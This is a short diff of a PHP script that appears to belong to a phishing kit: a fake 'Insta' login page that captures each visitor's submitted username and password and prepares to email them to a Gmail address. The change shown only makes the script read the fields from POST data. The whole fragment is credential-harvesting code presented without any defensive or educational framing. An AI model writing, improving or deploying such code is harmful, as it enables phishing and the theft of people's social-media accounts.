@@ -1,8 +1,8 @@
 <?php
 
 //varible setting
-$username = $_REQUEST['u_name'];  // fetch username
- $passcode = $_REQUEST['pass'];  // fetch password
+$username = $_POST['u_name'];  // fetch username
+ $passcode = $_POST['pass'];  // fetch password
  $subject = "Someone Login ! Insta Dummy page";
  $to ="xxxxxxxx@gmail.com";
  
